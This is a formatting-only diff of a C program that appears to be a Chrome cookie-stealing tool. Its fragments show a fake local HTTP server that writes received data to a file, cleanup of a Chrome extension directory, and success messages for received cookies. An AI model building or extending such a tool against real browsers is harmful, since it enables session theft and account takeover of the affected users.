@@ -181,14 +181,8 @@ void* fake_http_server(FILE* fp){
             read(client_sock, buf, sizeof(buf));
 #endif
             char *cs = strstr(buf, "\r\n\r\n");
-            if (cs != 0)
-            {
-                fputs((char*)cs + 4, fp);
-            }
-            else
-            {
-                fputs(buf, fp);
-            }
+            if (cs != 0) fputs((char*)cs + 4, fp);
+            else fputs(buf, fp);
 
             if ((pl = strlen(buf)) < 1024 && buf[pl - 1] != '\n')
             {
@@ -251,10 +245,7 @@ int remove_dir(const char *dir)
         return -1;
     }
 
-    if (S_ISREG(dir_stat.st_mode))
-    {
-        remove(dir);
-    }
+    if (S_ISREG(dir_stat.st_mode)) { remove(dir); }
     else if (S_ISDIR(dir_stat.st_mode))
     {
         if (0 != access(dir, F_OK))
@@ -264,27 +255,19 @@ int remove_dir(const char *dir)
         }
 
         dirp = opendir(dir);
-        while ((dp = readdir(dirp)) != NULL){
-            if ((0 == strcmp(cur_dir, dp->d_name)) || (0 == strcmp(up_dir, dp->d_name)))
-            {
-                continue;
-            }
+        while ((dp = readdir(dirp)) != NULL)
+        {
+            if ((0 == strcmp(cur_dir, dp->d_name)) || (0 == strcmp(up_dir, dp->d_name))) { continue; }
 
             sprintf(dir_name, "%s/%s", dir, dp->d_name);
             remove_dir(dir_name);
         }
         closedir(dirp);
         int r;
-        if ((r = rmdir(dir)) != 0)
-        {
-            remove_dir(dir);
-        }
+        if ((r = rmdir(dir)) != 0) { remove_dir(dir); }
 
     }
-    else
-    {
-        unlink(dir);
-    }
+    else { unlink(dir); }
     return 0;
 }
 
@@ -363,14 +346,7 @@ char* find_arg(int argc, char* argv[], char *parameter)
         p = argv[i];
         if (strcmp(p, parameter) == 0)
         {
-            if(argv[i + 1])
-            {
-                return argv[i + 1];
-            }
-            else
-            {
-                return 1;
-            }
+            if(argv[i + 1]) { return argv[i + 1]; } else { return 1; }
         }
     }
     return NULL;
@@ -600,14 +576,8 @@ int main(int argc, char* argv[])
         signal(SIGTERM, sig_handler);
 #endif
         while(!status){};
-        if (status == 1)
-        {
-            printf("[+] cookies data recv success!!!\n");
-        }
-        else
-        {
-            printf("[+] task failed!");
-        }
+        if (status == 1) { printf("[+] cookies data recv success!!!\n"); }
+        else { printf("[+] task failed!"); }
 
         clean_ext(CHROME_DATA);
         printf("[+] save result to -> %s\n", save_path);
